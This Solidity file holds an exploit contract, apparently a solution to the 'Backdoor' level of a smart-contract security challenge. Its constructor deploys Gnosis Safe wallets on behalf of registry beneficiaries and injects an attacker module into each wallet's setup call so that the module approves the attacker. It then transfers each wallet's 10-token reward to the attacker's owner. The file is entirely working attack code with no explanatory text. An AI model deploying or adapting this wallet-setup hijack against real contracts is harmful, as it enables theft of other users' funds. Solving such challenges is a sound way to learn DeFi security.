// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "../Attacker.sol";


contract BackdoorAttackerModule is Ownable {
    
    function approveTransferTokens(address token, address to, uint256 amount) external {
        IERC20(token).approve(to, amount);
    }
}

contract BackdoorAttacker is Attacker {

    IERC20 private immutable token;
    address private immutable walletMasterCopy;
    IProxyCreationCallback private immutable walletRegistry;
    GnosisSafeProxyFactory private immutable walletFactory;
    BackdoorAttackerModule private immutable module;


    constructor(address _token, address _walletMasterCopy, address _walletFactory, address _walletRegistry, address[] memory beneficiaries) {
        token = IERC20(_token);
        walletMasterCopy = _walletMasterCopy;
        walletFactory = GnosisSafeProxyFactory(_walletFactory);
        walletRegistry = IProxyCreationCallback(_walletRegistry);
        module = new BackdoorAttackerModule();

        // gas savings
        address zeroAddress = address(0);
        address ownerAddress = owner();
        address moduleAddress = address(module);
        address walletMasterCopyAddress = address(_walletMasterCopy);

        bytes memory setupModuleCall = abi.encodeWithSignature("approveTransferTokens(address,address,uint256)",_token, address(this), 10 ether);

        for (uint256 i = 0; i < beneficiaries.length;) {
            
            address[] memory owner = new  address[](1);
            owner[0] = beneficiaries[i];

            bytes memory initialSetup = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owner,
                1,
                moduleAddress,
                setupModuleCall,
                zeroAddress,
                zeroAddress,
                0,
                zeroAddress 
            ); 

            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(walletMasterCopyAddress, initialSetup, 133, walletRegistry);
            token.transferFrom(address(proxy), ownerAddress, 10 ether);

            unchecked {
                ++i;
            }
        }
    }
    
}
